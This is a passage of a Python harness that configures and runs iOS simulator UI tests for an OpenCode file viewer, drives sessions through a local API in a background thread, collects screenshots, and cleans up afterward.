    created.append(chat)
    environment["OPENCODE_CHAT_SESSION"] = chat
    environment["OPENCODE_CHAT_FIRST"] = answers[0]
    environment["OPENCODE_CHAT_SECOND"] = answers[2]
    run = plistlib.loads(next(derived.glob("Build/Products/OpenCode_*.xctestrun")).read_bytes())
    targets = ([t for c in run["TestConfigurations"] for t in c["TestTargets"]] if "TestConfigurations" in run else [v for k, v in run.items() if k != "__xctestrun_metadata__"])
    for target in targets:
        target.setdefault("EnvironmentVariables", {}).update(environment)
        target["CommandLineArguments"] = ["-OpenCodeServerURL", url]
        target["UITargetAppCommandLineArguments"] = ["-OpenCodeServerURL", url]
        target.setdefault("UITargetAppEnvironmentVariables", {})["OPENCODE_SERVER_PASSWORD"] = password
    configured.write_bytes(plistlib.dumps(run))
    configured.chmod(0o600)
    subprocess.run(["xcrun", "simctl", "status_bar", device, "override", "--time", "10:58", "--dataNetwork", "wifi", "--wifiMode", "active", "--wifiBars", "3", "--cellularMode", "active", "--cellularBars", "4", "--batteryState", "discharging", "--batteryLevel", "100"], check=True)
    result = evidence / ("file-viewer-" + theme + "-" + token + ".xcresult")
    command = ["xcodebuild", "test-without-building", "-xctestrun", str(configured), "-destination", "platform=iOS Simulator,id=" + device,
        "-parallel-testing-enabled", "NO", "-collect-test-diagnostics", "never", "-test-timeouts-enabled", "YES",
        "-maximum-test-execution-time-allowance", "600", "-resultBundlePath", str(result)]
    for test in sys.argv[1:] or ["OpenCodeUITests/FileViewerNavigationTests"]:
        command.append("-only-testing:" + test)
    # Background activity for the viewer-reload test: the UI test writes `zoomed`, this thread changes the open
    # Session (title, a short Luna 6 / low reply) and another one, then writes `done`.
    signals = Path(environment["OPENCODE_VIEWER_SIGNALS"])
    def background():
        while not (signals / "zoomed").exists():
            if (signals / "stop").exists():
                return
            time.sleep(0.2)
        log = []
        def step(name):
            log.append([round(time.time(), 3), name])
            print("VIEWER_BACKGROUND", name, flush=True)
        try:
            target = environment["OPENCODE_VIEWER_" + (signals / "zoomed").read_text().strip()]
            step("rename")
            api("/api/session/" + target, {"title": "Visualizador · renomeada"}, "PATCH")
            time.sleep(3)
            for session in [target, environment["OPENCODE_VIEWER_DOCS"]]:
                step("prompt " + session)
                before = int(time.time() * 1000)
                api("/api/session/" + session + "/prompt", {"id": "msg_" + uuid.uuid4().hex, "delivery": "steer",
                    "text": "Sem usar ferramentas, escreva uma lista numerada de 1 a 80, uma linha por item, cada item com uma frase curta sobre o mar."
                        if session == target else "Responda apenas com a palavra ok, sem usar ferramentas."})
                deadline = time.monotonic() + 90
                while time.monotonic() < deadline:
                    info = api("/api/session/" + session, method="GET")["data"]
                    if info["time"].get("idle", 0) > before:
                        break
                    time.sleep(0.5)
                last = api("/api/session/" + session + "/message?limit=1&order=desc", method="GET")["data"]
                step("idle " + session + " " + json.dumps(last)[:400])
                time.sleep(2)
        except Exception as error:
            step("error " + repr(error)[:300])
        (signals / "done").write_text(json.dumps(log))
    worker = threading.Thread(target=background, daemon=True)
    worker.start()
    status = subprocess.call(command)
    (signals / "stop").write_text("1")
    probe.shutdown()
    exported = evidence / ("attachments-" + token)
    subprocess.run(["xcrun", "xcresulttool", "export", "attachments", "--path", str(result), "--output-path", str(exported)], check=True)
    for test in json.loads((exported / "manifest.json").read_text()):
        for attachment in test["attachments"]:
            source = exported / attachment["exportedFileName"]
            if source.suffix == ".png":
                prefix = "failure-" if attachment["isAssociatedWithFailure"] else ""
                shutil.copyfile(source, evidence / (prefix + attachment["suggestedHumanReadableName"].split("_0_")[0] + ".png"))
    shutil.rmtree(exported)
    print(json.dumps({"status": status, "result": str(result), "ownedSessions": len(created)}))
    sys.exit(status)
finally:
    configured.unlink(missing_ok=True)
    for session in created:
        api("/api/session/" + session, method="DELETE")
    shutil.rmtree(root, ignore_errors=True)
    shutil.rmtree(outside, ignore_errors=True)
    shutil.rmtree(signals_dir, ignore_errors=True)
